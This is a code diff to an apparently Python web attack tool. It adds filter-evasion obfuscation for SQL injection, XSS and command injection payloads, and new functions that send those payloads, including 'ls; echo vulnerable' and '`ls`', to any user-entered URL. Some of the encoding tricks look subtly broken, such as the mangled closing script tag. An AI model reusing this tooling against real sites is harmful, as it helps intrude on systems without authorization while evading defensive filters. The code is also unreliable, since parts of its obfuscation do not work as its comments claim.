@@ -16,7 +16,7 @@ import time
 import requests
 import threading
 import mimetypes
-from urllib.parse import urljoin
+from urllib.parse import urljoin, quote
 from datetime import datetime
 from colorama import Fore, Style
 from bs4 import BeautifulSoup
@@ -66,6 +66,34 @@ def display_in_columns(options):
         for index, option in enumerate(options)
     ]
     print("    ".join(formatted_options))
+
+# Payload Obfuscation Functions
+
+# URL Encode Payloads
+def url_encode(payload):
+    return quote(payload)
+
+# Obfuscate SQL Injection Payloads
+def obfuscate_sql_injection(payload):
+    payload = payload.replace("OR", "O%52")  # Obfuscating the OR
+    payload = payload.replace("AND", "A%4E%44")  # Obfuscating AND
+    payload = url_encode(payload)  # URL encode the payload
+    return payload
+
+# Obfuscate XSS Payloads
+def obfuscate_xss(payload):
+    payload = payload.replace("<script>", "<ScRiPt>")  # Mixed case obfuscation
+    payload = payload.replace("</script>", "<&#115;cript>")  # Encode part of the closing tag
+    payload = payload.replace("<img", "<I%6Dg")  # URL encode tag names
+    return payload
+
+# Obfuscate Command Injection Payloads
+def obfuscate_command_injection(payload):
+    payload = payload.replace(";", "%3B")  # Obfuscate semicolon
+    payload = payload.replace("|", "%7C")  # Obfuscate pipe symbol
+    payload = payload.replace("`", "%60")  # Obfuscate backticks
+    payload = url_encode(payload)  # URL encode the payload
+    return payload
 
 # Attack Modules
 
@@ -128,14 +156,51 @@ def test_sql_injection(url, param_name):
     ]
     
     for payload in payloads:
-        data = {param_name: payload}
+        obfuscated_payload = obfuscate_sql_injection(payload)
+        data = {param_name: obfuscated_payload}
         response = SESSION.post(url, data=data, headers=HEADERS)
         if "error" in response.text or "syntax" in response.text:
-            log_report("SQL Injection", "Vulnerable", f"SQL Injection detected with payload: {payload}")
-            return f"SQL Injection: Vulnerable (Payload: {payload})"
+            log_report("SQL Injection", "Vulnerable", f"SQL Injection detected with payload: {obfuscated_payload}")
+            return f"SQL Injection: Vulnerable (Payload: {obfuscated_payload})"
     
     log_report("SQL Injection", "Not Vulnerable", "No SQL Injection detected.")
     return "SQL Injection: Not Vulnerable"
+
+# XSS Test (Non-destructive)
+def test_xss(url, param_name):
+    payloads = [
+        "<script>alert('XSS')</script>",  # Basic XSS
+        "<img src='x' onerror='alert(1)'>",  # Image-based XSS
+    ]
+    
+    for payload in payloads:
+        obfuscated_payload = obfuscate_xss(payload)
+        data = {param_name: obfuscated_payload}
+        response = SESSION.post(url, data=data, headers=HEADERS)
+        if "alert('XSS')" in response.text or "alert(1)" in response.text:
+            log_report("XSS", "Vulnerable", f"XSS detected with payload: {obfuscated_payload}")
+            return f"XSS: Vulnerable (Payload: {obfuscated_payload})"
+    
+    log_report("XSS", "Not Vulnerable", "No XSS detected.")
+    return "XSS: Not Vulnerable"
+
+# Command Injection Test
+def test_command_injection(url, param_name):
+    payloads = [
+        "ls; echo vulnerable",  # Basic command injection
+        "`ls`",  # Using backticks
+    ]
+    
+    for payload in payloads:
+        obfuscated_payload = obfuscate_command_injection(payload)
+        data = {param_name: obfuscated_payload}
+        response = SESSION.post(url, data=data, headers=HEADERS)
+        if "vulnerable" in response.text:
+            log_report("Command Injection", "Vulnerable", f"Command Injection detected with payload: {obfuscated_payload}")
+            return f"Command Injection: Vulnerable (Payload: {obfuscated_payload})"
+    
+    log_report("Command Injection", "Not Vulnerable", "No Command Injection detected.")
+    return "Command Injection: Not Vulnerable"
 
 # Main Script
 def main():
@@ -171,6 +236,10 @@ def main():
                 url = input("Enter URL for SQL Injection test: ")
                 param_name = input("Enter parameter name for SQL Injection: ")
                 print(test_sql_injection(url, param_name))
+            elif selection == 3:
+                url = input("Enter URL for XSS test: ")
+                param_name = input("Enter parameter name for XSS: ")
+                print(test_xss(url, param_name))
             elif selection == 10:
                 file_path = input("Enter file path for Web Shell test: ")
                 url = input("Enter URL for File Upload test: ")
